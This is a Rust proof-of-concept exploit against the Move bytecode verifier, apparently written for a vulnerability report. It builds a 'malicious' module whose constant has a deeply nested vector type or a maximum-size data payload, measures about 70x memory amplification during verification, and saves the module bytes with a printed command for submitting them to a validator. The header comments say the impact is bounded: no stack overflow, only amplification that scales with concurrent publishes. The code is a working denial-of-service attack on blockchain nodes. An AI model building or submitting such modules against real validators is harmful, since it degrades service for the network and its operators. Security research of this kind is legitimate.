// PoC: Move bytecode verifier - unbounded memory amplification via deeply nested constant type
//
// Root cause: `sig_to_ty()` and `is_valid_for_constant()` in move-binary-format/src/constant.rs
// recurse through SignatureToken::Vector without their own depth limit. However,
// SIGNATURE_TOKEN_DEPTH_MAX = 256 in the binary format (serializer + deserializer) caps nesting
// to 256 levels, preventing stack overflow at that depth (~20KB of stack usage).
//
// Actual impact: Memory amplification ~70x at the constant pool level.
//   - 65535 bytes of constant data -> ~4.7MB of MoveValue allocation per module publish.
//   - Not OOM individually, but scales with concurrent publish transactions.
//   - The fuzz OOM/slow-unit findings required Arbitrary-generated layouts that bypass the
//     binary format's 256-depth limit, which is not reachable from real validator inputs.
//
// Confirmed on m1: same SIGNATURE_TOKEN_DEPTH_MAX, same constant.rs, same verifier.rs.
//
// This PoC:
//   Mode 1 (default): directly tests the verifier at max allowed depth (256) to show it
//                     completes normally - confirms the bounded nature.
//   Mode 2 (--amplify): tests the memory amplification with max data at depth 1 to show
//                       the 70x amplification factor that exists even within the limits.

use move_binary_format::{
    file_format::{
        AddressIdentifierIndex, CompiledModule, Constant, IdentifierIndex, ModuleHandle,
        ModuleHandleIndex, SignatureToken,
    },
    file_format_common::VERSION_DEFAULT,
};
use move_bytecode_verifier::verify_module;
use move_core_types::{account_address::AccountAddress, identifier::Identifier};
use std::{env, fs};

fn build_malicious_module(depth: usize) -> CompiledModule {
    // Build vector^depth(u8): SignatureToken::Vector(Vector(...Vector(U8)...))
    let mut ty = SignatureToken::U8;
    for _ in 0..depth {
        ty = SignatureToken::Vector(Box::new(ty));
    }

    CompiledModule {
        version: VERSION_DEFAULT,
        self_module_handle_idx: ModuleHandleIndex(0),
        module_handles: vec![ModuleHandle {
            address: AddressIdentifierIndex(0),
            name: IdentifierIndex(0),
        }],
        struct_handles: vec![],
        function_handles: vec![],
        field_handles: vec![],
        friend_decls: vec![],
        struct_def_instantiations: vec![],
        function_instantiations: vec![],
        field_instantiations: vec![],
        signatures: vec![],
        identifiers: vec![Identifier::new("poc_dos").unwrap()],
        // Use a unique address so re-publishing doesn't fail with "already exists"
        address_identifiers: vec![AccountAddress::from_hex_literal("0xcafebabe00000001").unwrap()],
        constant_pool: vec![Constant {
            type_: ty,
            // BCS encoding of an empty vector (length prefix 0x00).
            // This is a valid serialization for vector^N(u8): outermost vector has 0 elements.
            // verify_constant_data succeeds... but only if sig_to_ty() doesn't crash first.
            data: vec![0x00],
        }],
        metadata: vec![],
        struct_defs: vec![],
        function_defs: vec![],
        struct_variant_handles: vec![],
        struct_variant_instantiations: vec![],
        variant_field_handles: vec![],
        variant_field_instantiations: vec![],
    }
}

fn main() {
    let args: Vec<String> = env::args().collect();
    let amplify_mode = args.iter().any(|a| a == "--amplify");

    // Binary format enforces SIGNATURE_TOKEN_DEPTH_MAX = 256 in both serializer and
    // deserializer, so we cannot exceed depth 256 through the module binary.
    let depth: usize = if amplify_mode {
        1 // depth 1 = vector<u8>, maximise data bytes instead
    } else {
        256 // max allowed by binary format
    };

    let data: Vec<u8> = if amplify_mode {
        // Fill constant data to CONSTANT_SIZE_MAX (65535 bytes).
        // ULEB128(65528) followed by 65528 U8 values.
        // This causes ~4.6MB of MoveValue allocation from 65KB input (~70x amplification).
        let count: u32 = 65528;
        let mut d = vec![];
        // ULEB128 encode count
        let mut n = count;
        loop {
            let mut byte = (n & 0x7f) as u8;
            n >>= 7;
            if n != 0 {
                byte |= 0x80;
            }
            d.push(byte);
            if n == 0 {
                break;
            }
        }
        d.extend(vec![0x42u8; count as usize]); // 65528 arbitrary U8 values
        d
    } else {
        vec![0x00] // empty vector - minimal data, focus on depth path
    };

    eprintln!("[*] Mode: {}", if amplify_mode { "amplification" } else { "depth (max allowed)" });
    eprintln!("[*] Building module: constant type=vector^{depth}(u8), data={} bytes", data.len());

    let mut module = build_malicious_module(depth);
    module.constant_pool[0].data = data.clone();

    // Serialize to bytes
    let mut module_bytes = vec![];
    match module.serialize(&mut module_bytes) {
        Ok(_) => {}
        Err(e) => {
            eprintln!("[!] Serialization failed: {e}");
            eprintln!("[!] SIGNATURE_TOKEN_DEPTH_MAX = 256 prevents crafting deeper types");
            eprintln!("[!] The fuzz OOM findings required Arbitrary-bypassed layouts (depth >> 256)");
            eprintln!("[!] Through the real binary format path, no stack overflow is triggerable.");
            return;
        }
    }

    eprintln!(
        "[*] Module size: {} bytes (limit: 65355)",
        module_bytes.len()
    );

    // Optionally save to file for validator submission
    if let Some(out_path) = args.iter().find(|a| a.ends_with(".mv")).cloned() {
        fs::write(&out_path, &module_bytes).expect("write failed");
        eprintln!("[*] Module bytes written to: {out_path}");
        eprintln!("[*] Submit with: python3 testsuite/poc-constant-dos/submit_poc.py {out_path}");
        return;
    }

    // Round-trip through binary deserializer (simulates what the validator receives)
    eprintln!("[*] Deserializing (simulating validator receive path)...");
    let module2 = CompiledModule::deserialize(&module_bytes).unwrap();

    eprintln!("[*] Calling verify_module...");
    let before = std::time::Instant::now();
    let result = verify_module(&module2);
    let elapsed = before.elapsed();

    eprintln!("[*] verify_module returned in {:?}: {:?}", elapsed, result);

    if amplify_mode {
        eprintln!();
        eprintln!("[*] AMPLIFICATION ANALYSIS:");
        eprintln!("    Input data:   {} bytes", data.len());
        eprintln!("    MoveValue nodes deserialized: ~{}", data.len().saturating_sub(4));
        let node_size = std::mem::size_of::<move_core_types::value::MoveValue>();
        eprintln!("    sizeof(MoveValue): {} bytes", node_size);
        eprintln!("    Peak allocation: ~{:.1} MB  ({}x amplification)",
            (data.len() as f64 * node_size as f64) / 1_048_576.0,
            node_size);
        eprintln!("    [*] Not OOM individually, but n concurrent publishes = n × {:.1}MB",
            (data.len() as f64 * node_size as f64) / 1_048_576.0);
    }
}
